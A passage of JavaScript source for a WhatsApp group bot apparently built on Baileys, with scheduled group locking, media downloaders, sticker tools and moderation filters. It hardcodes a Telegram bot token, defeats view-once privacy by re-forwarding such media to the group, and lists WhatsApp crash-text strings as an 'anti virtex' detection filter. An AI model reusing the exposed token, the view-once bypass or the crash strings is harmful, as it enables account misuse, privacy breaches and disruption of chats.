               onlygrub: false,
               onlypc: false,
               autorecordtype: false,
               autorecord: false,
               autotype: false,
               watermark: {
                  packname: global.packname, 
                  author: global.author
               },
               about: {
                  bot: {
                     nick: Yasam.getName(botNumber), 
                     alias: botname
                  },
                  owner: {
                     nick: Yasam.getName(global.ownernumber + '@s.whatsapp.net'), 
                     alias: global.ownernumber
                  }
               }
            }
            
        } catch (err) {
            console.log(err)
        }
       
        //photo uploader
        async function uploadtoimgur(imagepath) {
  try {
    const response = await Yasam.upload({
      image: fs.createReadStream(imagepath),
      type: 'stream',
    })

    let url = response.data.link
    console.log(url)
    return url
  } catch (error) {
    console.error('Error uploading image to Imgur:', error)
    throw error
  }
}        
        async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

//autoreact
const xeonreact = async () => {
  const emojis = ["🌷", "🤙", "😂", "🤣", "😭", "🫂", "💔", "😡"]; 
  for (const emoji of emojis) {
    await sleep(80);
    Yasam.sendMessage(m.chat, { react: { text: emoji, key: m.key }});
  }
  await sleep(50);
  Yasam.sendMessage(m.chat, { react: { text: randomemoji, key: m.key }});
}
// FUNCTION TIME AUTO CLOSE MAGHRIB
cron.schedule('0 0 18 * * *', async () => {
const getGroups = await Yasam.groupFetchAllParticipating()
const groups = Object.keys(getGroups)
let text = '*[ System Notice ]* Group Di Tutup Secara Otomatis'
Yasam.sendMessage(from, {text: '*[ System Notice ]* Segeralah Beribadah...'});
if (groups.some(v => v === from) && !(await Yasam.groupMetadata(from)).announce) {
Yasam.groupSettingUpdate(from, 'announcement').then(() => Yasam.sendMessage(from, {text: text}, {ephemeralExpiration: m.expiration}));
}
}, { scheduled: true, timezone: 'Asia/Jakarta' })
cron.schedule('0 0 19 * * *', async () => {
const getGroups = await Yasam.groupFetchAllParticipating()
const groups = Object.keys(getGroups)
let text = '*[ System Notice ]* Waktu maghrib usai, group dibuka kembali.'
if (groups.some(v => v === from) && (await Yasam.groupMetadata(from)).announce) {
Yasam.groupSettingUpdate(from, 'not_announcement');
Yasam.sendMessage(from, {text: text, mentions: Object.values(global.db.groups[from].member).map(v => v.id)}, {ephemeralExpiration: m.expiration});
Yasam.groupRequestParticipantsList(from).then(async (data) => {
if (data.length === 0) return
for (let i of data) {
await Yasam.groupRequestParticipantsUpdate(from, [i.jid], 'approve')
await sleep(1000)
}
})
}
}, { scheduled: true, timezone: 'Asia/Jakarta' })

// FUNCTION TIDUR
cron.schedule('0 0 23 * * *', async () => {
const getGroups = await Yasam.groupFetchAllParticipating()
const groups = Object.keys(getGroups)
let text = '*[ System Notice ]* Group Di Tutup Secara Otomatis'
let imejnya = getBuffer('https://telegra.ph/file/3686f3e8dbe085a7b20fe.png')
let tidurnya = await Yasam.downloadAndSaveMediaMessage(imejnya, + new Date * 1)
Yasam.imgToSticker(from, tidurnya, m, {packname: packname, author: global.author});
if (groups.some(v => v === from) && !(await Yasam.groupMetadata(from)).announce) {
Yasam.groupSettingUpdate(from, 'announcement').then(() => Yasam.sendMessage(from, {text: text}, {ephemeralExpiration: m.expiration}));
}
}, { scheduled: true, timezone: 'Asia/Jakarta' })

// FUNCTION MORNING TIME 

cron.schedule("0 0 4 * * *", () => {
Yasam.sendMessage(m.chat, { text : '*[ System Notice ]* Bangunnnn!! udah shubuhh (─.─||）', mentions: participants.map(a => a.id)})
}, {scheduled: true, timezone: "Asia/Jakarta"});

cron.schedule('0 0 22 * * *', async () => {
const getGroups = await Yasam.groupFetchAllParticipating()
const groups = Object.keys(getGroups)
let text = '*[ System Notice ]* Group Di Tutup Secara Otomatis'
Yasam.sendMessage(from, {text: '*[ System Notice ]* Tidur manis (ー_ー゛)'});
if (groups.some(v => v === from) && !(await Yasam.groupMetadata(from)).announce) {
Yasam.groupSettingUpdate(from, 'announcement').then(() => Yasam.sendMessage(from, {text: text}, {ephemeralExpiration: m.expiration}));
}
}, { scheduled: true, timezone: 'Asia/Jakarta' })

cron.schedule('0 0 6 * * *', async () => {
const getGroups = await Yasam.groupFetchAllParticipating()
const groups = Object.keys(getGroups)
let text = '*[ System Notice ]* Sistem secara otomatis membuka grup ini karena pagi hari.'
if (groups.some(v => v === from) && (await Yasam.groupMetadata(from)).announce) {
Yasam.groupSettingUpdate(from, 'not_announcement');
Yasam.sendMessage(from, {text: text, mentions: Object.values(global.db.groups[from].member).map(v => v.id)}, {ephemeralExpiration: m.expiration});
Yasam.groupRequestParticipantsList(from).then(async (data) => {
if (data.length === 0) return
for (let i of data) {
await Yasam.groupRequestParticipantsUpdate(from, [i.jid], 'approve')
await sleep(1000)
}
})
}
}, { scheduled: true, timezone: 'Asia/Jakarta' })      
 //End  
//bug loading
async function loading () {
var xeonlod = [
    "□□■■■■■■■■\n             𝟷𝟶٪",
    "■■□□■■■■■■\n             𝟹𝟶٪",
    "■■■■□□■■■■\n             𝟻𝟶٪",
    "■■■■■■□□■■\n             𝟾𝟶٪",
    "■■■■■■■■□□\n             𝟷𝟶𝟶٪",
    "ʟ ᴏ ᴀ ᴅ ɪ ɴ ɢ  ᴄ ᴏ ᴍ ᴘ ʟ ᴇ ᴛ ᴇ. . ."
  ];
let { key } = await Yasam.sendMessage(m.chat, {text: '_Loading_'})//Pengalih Isu

for (let i = 0; i < xeonlod.length; i++) {
await Yasam.sendMessage(from, {text: xeonlod[i], edit: key })
}
}


const xeonimun = (texto) => {
Yasam.sendMessage(from, { text: texto, mentions: [sender]}, {quoted: fvrif }).catch(e => {
return m.reply("Erro..")
})
}

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        )
        const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

//sticker meta function
async function addExifAvatar(buffer, packname, author, categories = [''], extra = {}) {
  const {
      default: {
            Image
                }
                  } = await import('node-webpmux')
                    const img = new Image()
                      const json = {
                          'sticker-pack-id': 'Natsxe',
                              'sticker-pack-name': packname,
                                  'sticker-pack-publisher': author,
                                      'emojis': categories,
                                          'is-avatar-sticker': 1,
                                              ...extra
                                                }
                                                  let exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00])
                                                    let jsonBuffer = Buffer.from(JSON.stringify(json), 'utf8')
                                                      let exif = Buffer.concat([exifAttr, jsonBuffer])
                                                        exif.writeUIntLE(jsonBuffer.length, 14, 4)
                                                          await img.load(buffer)
                                                            img.exif = exif
                                                              return await img.save(null)
                                                              }
function makeid(length) {
  let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
      const charactersLength = characters.length;
  for (let i = 0; i < length; i++) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
        }
  return result;
  }

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}
        
        async function Telesticker(url) {
    return new Promise(async (resolve, reject) => {
        if (!url.match(/(https:\/\/t.me\/addstickers\/)/gi)) return replygcxeon('Enther your url telegram sticker link')
        packName = url.replace("https://t.me/addstickers/", "")
        data = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(packName)}`, {method: "GET",headers: {"User-Agent": "GoogleBot"}})
        const xeonyresult = []
        for (let i = 0; i < data.data.result.stickers.length; i++) {
            fileId = data.data.result.stickers[i].thumb.file_id
            data2 = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`)
            result = {
            status: 200,
            author: 'DGXeon',
            url: "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + data2.data.result.file_path
            }
            xeonyresult.push(result)
        }
    resolve(xeonyresult)
    })
}

//mega download
function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';

    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));

    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

//trace anime
function formatDuration(ms) {
  let seconds = Math.floor((ms / 1000) % 60);
  let minutes = Math.floor((ms / (1000 * 60)) % 60);
  let hours = Math.floor((ms / (1000 * 60 * 60)) % 24);
  return `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}:${seconds.toString().padStart(2, "0")}`;
}
        
        //limit func
        async function useLimit(senuseLimitder, amount) {
            db.data.users[sender].limit -= amount
            db.data.users[sender].totalLimit += amount
            replygcxeon(`You have used up: ${amount} limit\nRemaining: ${db.data.users[sender].limit} limit`)
        }
        async function resetLimit() {
            let users = Object.keys(global.db.data.users)
            let Limitxeon = isPremium ? limit.prem : limit.free
            for (let i of users) {
               db.data.users[i].limit = Limitxeon
            }
            Yasam.sendText('120363167338947238@g.us', { text: `Reset Limit`})
        }
        // Grup Only
        if (!m.isGroup && !YasamCreator && db.data.settings[botNumber].onlygrub ) {
        	if (isCommand){
            return;
            }
        }
        // Private Only
        if (!YasamCreator && db.data.settings[botNumber].onlypc && m.isGroup) {
        	if (isCommand){
	         return;
	   }
	}
	     
        if (!Yasam.public) {
            if (YasamCreator && !m.key.fromMe) return
        }
        if (db.data.settings[botNumber].online) {
        	if (isCommand) {
        	Yasam.sendPresenceUpdate('unavailable', from)
        }
        }
        if (db.data.settings[botNumber].autoread) {
            Yasam.readMessages([m.key])
        }
        //auto set bio\\
	if (db.data.settings[botNumber].autobio) {
            Yasam.updateProfileStatus(`${botname} Aktif Dalam  ${runtime(process.uptime())}`).catch(_ => _)
        }
     //auto type record
        if (db.data.settings[botNumber].autorecordtype){
        if (isCommand) {
            let xeonmix = ['composing', 'recording']
            xeonmix2 = xeonmix[Math.floor(xeonmix.length * Math.random())]
            Yasam.sendPresenceUpdate(xeonmix2, from)
        }
        }
        if (db.data.settings[botNumber].autorecord){
        if (isCommand) {
        	let xeonmix = ['recording']
            xeonmix2 = xeonmix[Math.floor(xeonmix.length * Math.random())]
            Yasam.sendPresenceUpdate(xeonmix2, from)
        }
        }
        if (db.data.settings[botNumber].autotype){
        if (isCommand) {
        	let xeonpos = ['composing']
            Yasam.sendPresenceUpdate(xeonpos, from)
        }
        }
        
        //auto block number
        if (m.sender.startsWith(`${autoblocknumber}`) && db.data.settings[botNumber].autoblocknum === true) {
            return Yasam.updateBlockStatus(m.sender, 'block')
        }
        if (!m.sender.startsWith('91') && db.data.settings[botNumber].onlyindia === true) {
            return Yasam.updateBlockStatus(m.sender, 'block')
        }
        if (!m.sender.startsWith('62') && db.data.settings[botNumber].onlyindo === true) {
            return Yasam.updateBlockStatus(m.sender, 'block')
        } 
        if (!m.sender.startsWith(`${antiforeignnumber}`) && db.data.chats[m.chat].antiforeignnum === true){ 
        	if (YasamCreator || isAdmins || !isBotAdmins) return
            Yasam.sendMessage(m.chat, { text: `Sorry buddy! you will be removed because the group admin/owner has enabled anti foreign number, only +${antiforeignnumber} country code is allowed to join the group` }, {quoted: fvrif})
            await sleep(2000)
            await Yasam.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        let list = []
for (let i of owner) {
list.push({
	    	displayName: await Yasam.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await Yasam.getName(i)}\nFN:${await Yasam.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
        //console log
        if (isCommand) {
            console.log(color(`\n< ================================================== >\n`, 'cyan'))
            console.log(chalk.black(chalk.bgWhite(!isCommand ? '[ MESSAGE ]' : '[ COMMAND ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
            global.db.data.settings[botNumber].totalhit += 1
        }

        //antiviewonce
    if ( db.data.chats[m.chat].antiviewonce && m.isGroup && m.mtype == 'viewOnceMessageV2') {
        let val = { ...m }
        let msg = val.message?.viewOnceMessage?.message || val.message?.viewOnceMessageV2?.message
        delete msg[Object.keys(msg)[0]].viewOnce
        val.message = msg
        await Yasam.sendMessage(m.chat, { forward: val }, { quoted: fvrif })
    }
    
    //antispam kick
if (db.data.chats[m.chat].antispam) {
if (m.isGroup && m.message && xeon_antispam.isFiltered(from)) {
console.log(`[SPAM]`, color(moment(m.messageTimestamp * 100).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(m.pushName))
return await Yasam.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}
    
    // Anti promotion
if (db.data.chats[m.chat].antipromotion) {
if (budy.match(`instagram booster|tiktok booster|ml booster|bgmi selling|selling uc|selling diamonds|selling coin|selling id|selling account|selling ids|buy account|sell account|buy id|sell id|instagram followers|tiktok followers|buy panel|sell panel|sell bug bot|buy bug bot|buy bot bug|sell bot bug|adminpanel5kpm|open jasa push member grup|yangmaubuypanelpm|admin panel 10k pm|Hanya menyediakan Jasa Push Member Grup|admin panel 5k pm|yang mau beli panel murah pm|list harga panel by|list harga vps|LIST HARGA VPS|OPEN JASA PUSH MEMBER GRUP|READY|Redy|LIST HARGA PANEL BY|list harga panel|menyediakan|MENYEDIAKAN|OPEN MURBUG|open|OPEN|PANEL READY|PANEL|PANNEL READY|panel|panel ready|pannel ready minat pm|mau panel pm|MAU PANNEL PM|Admin panel ready|ADMIN PANEL READY|Chat aja om ready selalu|OPEN JASA INSTALL|open jasa installMENYEDIAKAN JASA INSTALL|menyediakan jasa install`)) {
if (!isBotAdmins) return
if(YasamCreator) return
if (isAdmins) return
Yasam.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
Yasam.sendMessage(from, {text:`\`\`\`「 Promotion Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a promotion message and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
}
}

        //ANTI VIRUS
if (isGroup && db.data.chats[m.chat].antivirtex) {
if (budy.includes('๒๒๒๒') || budy.includes('ดุ') || budy.includes('ผิดุท้เึางืผิดุท้เึางื') || budy.includes('๑๑๑๑๑๑๑๑') || budy.includes('৭৭৭৭৭৭৭৭') || budy.includes('   ⃢   ⃢   ⃢  ') || budy.includes('*⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟') || budy.includes('ผดิทุเ้ึางผืดิทุเ้') || budy.includes('.*࡞ࣰࣰࣰࣲࣲࣲࣲࣩࣩࣩࣩࣶࣶ࣯࣯࣮࣮ࣦ࣯ࣨࣨࣨࣻࣻࣻࣼࣼࣼࣽࣽࣾࣷࣵࣴ࣬࣬࣬ࣤࣤࣧࣧ*') || budy.includes('᥋') || budy.includes('؁') || budy.includes('ٯٯٯٯٯ') ) {
if (isGroupAdmins) return replygcxeon('*VIRTEX DETECTED*')
console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
Yasam.sendText(m.chat, `*MARK AS READ*\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n *Virus sender here👇:* \nwa.me/${sender.split("@")[0]}`)   
if (!isBotAdmins) return
if(YasamCreator) return
Yasam.groupParticipantsUpdate(from, [sender], 'remove')
await Yasam.sendMessage(from, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
Yasam.sendMessage(`${ownernumber}@s.whatsapp.net`,{text: `Hi Owner! wa.me/${sender.split("@")[0]} Detected Having Sent Virtex ${isGroup?`in ${groupName}`:''}`})
 }
 }
 
 if (db.data.chats[m.chat].antibot) {
    if (m.isBaileys && m.fromMe == false){
        if (isAdmins || !isBotAdmins){		  
        } else {
          replygcxeon(`*Bot Lain Terdeteksi*\n\nHusshhh Keluar dari grup ini!!!`)
    return await Yasam.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
    }
   }
 
        //anti media
        if (db.data.chats[m.chat].antimedia && isMedia) {
        if (YasamCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygcxeon(`\`\`\`「 Media Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-media for this group`)
    return Yasam.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
  }
        if (db.data.chats[m.chat].image && isXeonMedia) {
    if(isXeonMedia === "imageMessage"){
        if (YasamCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygcxeon(`\`\`\`「 Image Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-image for this group`)
    return Yasam.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        if (db.data.chats[m.chat].antivideo && isXeonMedia) {
    if(isXeonMedia === "videoMessage"){
        if (YasamCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygcxeon(`\`\`\`「 Video Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-video for this group`)
    return Yasam.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        if (db.data.chats[m.chat].antisticker && isXeonMedia) {
    if(isXeonMedia === "stickerMessage"){
        if (YasamCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygcxeon(`\`\`\`「 Sticker Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-sticker for this group`)
    return Yasam.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        if (db.data.chats[m.chat].antiaudio && isXeonMedia) {
    if(isXeonMedia === "audioMessage"){
        if (YasamCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygcxeon(`\`\`\`「 Audio Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-audio for this group`)
    return Yasam.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
       if (db.data.chats[m.chat].antipoll && isXeonMedia) {
    if(isXeonMedia === "pollCreationMessage"){
        if (YasamCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygcxeon(`\`\`\`「 Poll Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-poll for this group`)
    return Yasam.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
       if (db.data.chats[m.chat].antilocation && isXeonMedia) {
    if(isXeonMedia === "locationMessage"){
        if (YasamCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygcxeon(`\`\`\`「 Location Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-location for this group`)
    return Yasam.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
       if (db.data.chats[m.chat].antidocument && isXeonMedia) {
    if(isXeonMedia === "documentMessage"){
        if (YasamCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygcxeon(`\`\`\`「 Document Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-document for this group`)
    return Yasam.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
      if (db.data.chats[m.chat].anticontact && isXeonMedia) {
    if(isXeonMedia === "contactMessage"){
        if (YasamCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygcxeon(`\`\`\`「 Contact Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-contact for this group`)
    return Yasam.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        //respond
        if (db.data.chats[m.chat].badword) {
            for (let bak of bad) {
               if (budy === bak) {
                  let baduser = await db.data.users[sender].badword
                  Yasam.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Yasam.sendMessage(from, {text:`\`\`\`「 Bad Word Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} was using harsh words and his chat has been deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
               }
            }
        }
        //auto download #ctto
        if (db.data.settings[botNumber].autodownload && !m.key.fromMe && !isCmd2) {
try {
	// Auto download tiktok
  if (budy.startsWith('https://vt.tiktok.com/') || budy.startsWith('https://www.tiktok.com/') || budy.startsWith('https://t.tiktok.com/') || budy.startsWith('https://vm.tiktok.com/')) {
reply(mess.wait)
try {
  const data = await fetchJson(`https://api.tiklydown.eu.org/api/download?url=${encodeURIComponent(budy)}`)
  const vidnya = data.video.noWatermark
  const caption = `*[ TIKTOK DOWNLOADER ]*

*Video dari* _${data.author.name ?? ''} (@${data.author.unique_id ?? ''})_
*Likes*: _${data.stats.likeCount ?? ''}_
*Comments*: _${data.stats.commentCount ?? ''}_
*Shares*: _${data.stats.shareCount ?? ''}_
*Plays*: _${data.stats.playCount ?? ''}_
*Saves*: _${data.stats.saveCount ?? ''}_

\`⏤͟͟͞͞ Downloader By ${botname}\`
`;
  Yasam.sendMessage(m.chat, { caption: caption, video: { url: vidnya } }, { quoted: m })
} catch {
  const response = await fetchJson(`https://api.tiklydown.eu.org/api/download/v3?url=${encodeURIComponent(budy)}`)
  const videoUrl = response.result.video;
  const captionn = `*[ TIKTOK DOWNLOADER ]*

Likes: ${response.result.statistics.likeCount ?? ''}
Comments: ${response.result.statistics.commentCount ?? ''}
Shares: ${response.result.statistics.shareCount ?? ''}
by ${response.result.author.nickname ?? ''}

\`⏤͟͟͞͞ Downloader By ${botname}\`
  `;
  Yasam.sendMessage(m.chat, { caption: captionn, video: { url: videoUrl } }, { quoted: m })
}
  }
if (budy.match(`instagram.com`)) {
await Yasam.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anu = await fetchJson(`https://api.junn4.my.id/download/instagram?url=${budy}`)
Yasam.sendMessage(m.chat, { video: { url: anu.result.media}, caption: `Auto Download ✅`}, {quoted: fvrif})
await Yasam.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} else if (budy.match(`facebook.com`)) {
await Yasam.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anu = await fetchJson(`https://api.junn4.my.id/download/facebook?url=${budy}`)
Yasam.sendMessage(m.chat, { video: { url: anu.result.video_sd}, caption: `Auto Download ✅`}, {quoted: fvrif})
await Yasam.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} else if (budy.match(`youtube.com|youtu.be`)) {
await Yasam.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anu = await fetchJson(`https://api.junn4.my.id/download/ytmp4?url=${budy}`)
Yasam.sendMessage(m.chat, { video: { url: anu.result.result}, caption: ``}, {quoted: fvrif})
await Yasam.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} 
} catch (err) {
await Yasam.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
} 
        
        //autosticker
        if (db.data.settings[botNumber].autosticker) {
        	if (m.key.fromMe) return
            if (/image/.test(mime) && !/webp/.test(mime)) {
                let mediac = await quoted.download()
                Yasam.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
                console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return
                let mediac = await quoted.download()
                Yasam.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }
        
        if (db.data.chats[m.chat].antilinkgc) {
            if (budy.match(`chat.whatsapp.com`)) {
                replygcxeon (`「 ANTI LINK WHATSAPP 」\n\nKamu Terdeteksi Mengirim Link Group, Maaf Kamu Akan Di Kick !`)
                if (!isBotAdmins) return replygcxeon (`Ehh Bot Gak Admin T_T`)
